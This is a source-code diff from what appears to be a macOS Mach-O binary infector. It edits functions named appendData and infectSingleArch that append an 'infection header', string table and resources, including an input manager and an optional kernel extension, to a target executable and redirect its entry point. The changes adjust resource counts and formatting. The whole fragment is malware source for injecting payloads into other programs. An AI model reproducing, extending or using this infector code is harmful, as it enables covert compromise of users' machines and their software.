@@ -160,7 +160,7 @@ int appendData (char *inputFilePointer,
   if (gKextFileSize > 0)
     numberOfResources = 4;
   else
-    numberOfResources = 2;
+    numberOfResources = 3;
   
   originalEP = getBinaryEP ((byte *)(inputFilePointer + archOffset));
 #ifdef DEBUG
@@ -195,7 +195,7 @@ int appendData (char *inputFilePointer,
 #ifdef WIN32
       strncpy_s(strings.value, sizeof(strings.value), _strings[z], _TRUNCATE);
 #else
-	  strncpy (strings.value, _strings[z], sizeof (strings.value));
+      strncpy (strings.value, _strings[z], sizeof (strings.value));
 #endif
 
 #ifdef DEBUG_VERBOSE
@@ -208,7 +208,8 @@ int appendData (char *inputFilePointer,
     }
   
   // Set the new EP + 4 (number of Resources)
-  if (setBinaryEP ((byte *)(outputFilePointer + archOffset), segmentVMAddr
+  if (setBinaryEP ((byte *)(outputFilePointer + archOffset),
+                   segmentVMAddr
                    + sizeof (infectionHeader)
                    + sizeof (stringTable) * gNumStrings) == -1)
     {
@@ -434,7 +435,7 @@ int appendData (char *inputFilePointer,
 #else
   close (tempFD);
 #endif
-
+  
   return offset;
 }
 
@@ -469,9 +470,9 @@ int infectSingleArch (char *inputFilePointer,
       return kErrorFileNotSupported;
     }
   
-  // Increment header sizeofcmds since we're adding a new section
   //m_header->sizeofcmds += sizeof (struct section);
   
+  // Increment header sizeofcmds since we're adding a new segment
   m_header->sizeofcmds += sizeof (struct segment_command);
   m_header->ncmds      += 1;
   
@@ -960,14 +961,16 @@ main (int argc, _mChar *argv[])
                     + gInputManagerFileSize
                     + sizeof (infectionHeader)
                     + sizeof (stringTable) * gNumStrings
-                    + sizeof (resourceHeader) * ((gKextFileSize > 0) ? 3 : 2);
+                    + sizeof (resourceHeader) * ((gKextFileSize > 0) ? 4 : 3);
 
 #ifdef DEBUG_VERBOSE
   printf ("unpadded outSize: %d\n", outputFileSize);
 #endif
   
   if (outputFileSize % PAGE_ALIGNMENT)
-    outputFileSize = ((outputFileSize + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
+    {
+      outputFileSize = ((outputFileSize + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
+    }
 
   int tempSize = outputFileSize + inputFileSize;
   
